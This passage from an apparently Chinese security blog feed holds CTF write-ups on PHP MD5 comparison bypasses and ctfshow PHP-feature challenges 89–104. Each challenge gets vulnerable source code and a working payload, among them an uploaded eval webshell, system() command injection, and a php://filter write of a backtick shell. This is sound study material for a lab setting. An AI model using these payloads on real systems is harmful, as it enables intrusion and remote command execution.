string(3) &quot;red&quot;</span><br><span class="line">  &#x27;model&#x27; =&gt;</span><br><span class="line">  string(4) &quot;vivo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>md5强弱碰撞及绕过</title>
      <link href="/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
      <url>/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="1-弱比较"><a href="#1-弱比较" class="headerlink" title="1.弱比较"></a>1.弱比较</h2><p>a和b两个值不直接相等，但通过md5后相等</p><p>用0e科学计数法绕过，0exxx 会被看成0的多少次方，结果为零</p><p>240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361</p><h2 id="2-强比较"><a href="#2-强比较" class="headerlink" title="2.强比较"></a>2.强比较</h2><p>要先判断字符串类型是否相同再判断值</p><p>用数组绕过 md5不能加密数组，在加密数组的时候会返回NULL，如果设置没有判断变量类型或内容，就可以使用，因此，强弱比较都是可以使用数组绕过的。</p><p>a[]&#x3D;1&amp;b[]&#x3D;2</p><h2 id="3-真实碰撞对"><a href="#3-真实碰撞对" class="headerlink" title="3.真实碰撞对"></a>3.真实碰撞对</h2><p>值不相等，通过md5后值相等</p><p>0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</p><p>和0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2025/04/23/php%E7%89%B9%E6%80%A7/"/>
      <url>/2025/04/23/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="89"><a href="#89" class="headerlink" title="89."></a>89.</h3><p><a href="https://www.runoob.com/php/php-intval-function.html">intval函数(获取变量的整数型)</a>：如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0</p><p><strong>payload：?num[]&#x3D;1</strong></p><h3 id="91"><a href="#91" class="headerlink" title="91."></a>91.</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个匹配 ^表示开始 $表示结束 i表示不区分大小写 <code>m</code>表示多行模式逐行检查，只要有一行满足以<code>php</code>开头并以<code>php</code>结尾（不区分大小写），就会匹配成功。而<code>/^php$/i</code>只进行单行匹配</p><p>？cmd&#x3D;php%0Aphp 这样多行 存在有php 符合第一个 但第二个匹配 整体被看成一行 不满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="93"><a href="#93" class="headerlink" title="93."></a>93.</h3><p>要表示数字4476 不能直接&#x3D;4476 intval转换成整数后为4476 过滤了字母 不能用16进制0x 可以用八进制 以0开头 ?num&#x3D;010574 还可以用小数 ?num&#x3D;4476.1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="94"><a href="#94" class="headerlink" title="94."></a>94.</h3><p><code>strpos</code>函数用于查找一个字符串在另一个字符串中首次出现的位置 这里表示从num变量中查找“0”的位置，必须要有0且0不能在第一位，如果 <code>0</code> 在第一个位置，<code>strpos($num, &quot;0&quot;)</code> 会返回 <code>0</code> ，经过逻辑非运算后条件成立，就会执行 <code>die(&quot;no no no!&quot;)</code> 终止脚本执行</p><p>用八进制？num&#x3D;+01057</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="97"><a href="#97" class="headerlink" title="97."></a>97.</h3><p>用数组绕过md5 md5对数组是不予加密的，但是这个函数是返回值类型的，没有返回对象，便是返回null（null是无对象的意思，可以理解为没有目标）,所以两个都是null，可以绕过里面的比较，但是外面还有一个a!&#x3D;b,绕过姿势为：?a[]&#x3D;1&amp;b[]&#x3D;2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>三元运算符</p><p>类型 变量名 &#x3D; (条件表达式)? 表达式1:表达式2；<br>（）括号内进行逻辑运算，结果为boolean值，当值为true时返回表达式1的值给左边的变量，当括号内值为false时则返回表达式2的值给左边的变量。<br>注意：<br>1、表达式1与表达式2的类型要求是一致的，左边的变量名不要求一致，可以通过强制转换达到变换类型的目的。<br>2、三元运算可以嵌套使用，表达式1可以是一个新的三元运算，只要其返回值类型与表达式2一致即可。<br>3、凡是三元运算均可以转换为if-else，但是反过来不一定可以。</p><p>post传入给了get get里面不能有flag，否则被替换成COOKIE,SERVER,所以直接post上传一个HTTP_FLAG&#x3D;flag 这样就传给了get 最终显示$flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="99"><a href="#99" class="headerlink" title="99."></a>99.</h3><p>0x36d 16进制转换为10进制为877，执行一次i加一</p><ul><li><p><code>array_push</code> 函数用于把一个或多个元素添加到数组的末尾。</p></li><li><p><code>rand(1, $i)</code> 是一个随机数生成函数，会生成一个介于 1 到 <code>$i</code> 之间（包含 1 和 <code>$i</code>）的随机整数。</p><p>把每次生成的随机数添加到 <code>$allow</code> 数组的末尾。</p></li><li><p><code>isset($_GET[&#39;n&#39;])</code> 用于检查通过 GET 请求传递的参数 <code>n</code> 是否存在。</p></li><li><p><code>in_array($_GET[&#39;n&#39;], $allow)</code> 用于检查 <code>$_GET[&#39;n&#39;]</code> 的值是否存在于 <code>$allow</code> 数组中。</p></li><li><p>只有当这两个条件都满足时，才会执行花括号内的代码。</p></li><li><p><code>file_put_contents</code> 是一个用于将数据写入文件的函数。</p></li><li><p><code>$_GET[&#39;n&#39;]</code> 是用户通过 GET 请求传递的文件名。</p></li><li><p><code>$_POST[&#39;content&#39;]</code> 是用户通过 POST 请求传递的文件内容。</p><p>把 <code>$_POST[&#39;content&#39;]</code> 的内容写入到以 <code>$_GET[&#39;n&#39;]</code> 命名的文件中。</p><h2 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool in_array (mixed $needle, array $haystack [, bool $strict = FALSE])</span><br></pre></td></tr></table></figure><ul><li><p><strong><code>$needle</code></strong>：要在数组中搜索的值，数据类型可以是任意类型。比如字符串、数字、数组等。</p></li><li><p><strong><code>$haystack</code></strong>：要进行搜索的目标数组，是必需参数 。</p></li><li><p><strong><code>$strict</code></strong>：可选参数，默认值为 <code>FALSE</code>。若设为 <code>TRUE</code>，函数会在判断值是否存在的同时，严格比较数据类型，要求值和类型都与数组中的元素完全匹配才认为存在。</p><p>in_array() 函数存在弱比较的漏洞，如果没有设置第三个参数，in_array() 函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP 会尝试将字符串转换为整数来进行比较。1.php 就自动转换为了整数 1，也就符合在数组中的条件。</p><p>?n&#x3D;1.php 这样in_array()函数比较时转换成1，而1一定在$allow中，然后post上传一个一句话木马 ，再传给了n，</p><p>post  content&#x3D;&lt;?eval ($_post[‘a’])</p></li></ul><p>再访问这个一句话木马文件 1.php 再post执行命令a&#x3D;system(‘ls’)</p><p>再抓取文件a&#x3D;system(‘tac flag36d.php’)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="100"><a href="#100" class="headerlink" title="100."></a>100.</h3><p>is_numeric 函数用于判断一个变量是否为数字或者可以转换为数字的字符串。</p><p>这有一个优先级问题，赋值&#x3D;的优先级高于and 所以先运算$v0&#x3D;is_numeric($v1)，只要v1为数字，v0就为真，就可以进入后面的if运算 v2不能有； v3要有； 构造v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&amp;v3&#x3D;;  然后在查看目标文件</p><p>这里虽然system(‘ls’)后面拼接了ctfshow，但<code>ctfshow</code> 在这里并非有效的 PHP 语法结构（既不是函数调用、变量使用，也不是有效的语句），但 <code>system(&#39;ls&#39;)</code> 已经先执行完了。也就是说，<code>system(&#39;ls&#39;)</code> 是一个独立的函数调用，它会在 PHP 解析器尝试处理 <code>ctfshow</code> 之前执行并输出结果</p><p> 也可以用?v1&#x3D;1&amp;v2&#x3D;eval($_POST[1])?&gt;&amp;v3&#x3D;; </p><p>post：1&#x3D;system(‘ls’);</p><p>还可以?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)?&gt;&amp;v3&#x3D;;</p><p>var_dump主要用于输出变量的详细信息，包括变量的类型和值</p><p>print_r  函数 var_export函数也可以输出详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;</span><br><span class="line">        if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="101"><a href="#101" class="headerlink" title="101."></a>101.</h3><p>过滤了太多，用反射类  ?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>ReflectionClass 是 PHP 中用于反射类的内置类，它允许获取关于类的信息，比如类的方法、属性等，’ctfshow’ 是传递给 ReflectionClass 构造函数的类名，这段代码的实际作用是创建一个 ReflectionClass 对象，用来反射名为 ‘ctfshow’ 的类，并将其输出（echo）到页面上。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="102"><a href="#102" class="headerlink" title="102."></a>102.</h3><p>要求v2为数字，取v2的第三位到最后一位传给$s</p><p>$s作为参数传给v1函数  其结果传给$str </p><p> file_put_contents($v3,$str) 把str写入v3指定的文件</p><p>因为v2全是数字，所以将命令base64编码后，再转化为16进制，让v1为hex2bin函数，可以将16进制转换为ascii码  &lt;?&#x3D;<code>cat *</code>; base64编码后PD89YGNhdCAqYDs&#x3D; 再16进制5044383959474e68644341715944733d 结尾的 3d 肯定是不行的，因此去掉 3d，相当于去掉的是 base64 里的等号,不影响 因为$s要的是v2的第三位起，所以再在前面添加两个数字</p><p>v2&#x3D;005044383959474e6864434171594473</p><p>v3 传入伪协议，用来对要写入的数据先进行 Base64 解码：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64- decode&#x2F;resource&#x3D;1.php</p><p>完整payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure><p>post</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><?=`cat *`;这个被写入1.php 最后访问1.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table>### 104.没有说v1和v2不同 直接相等 shal后一定也相等<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 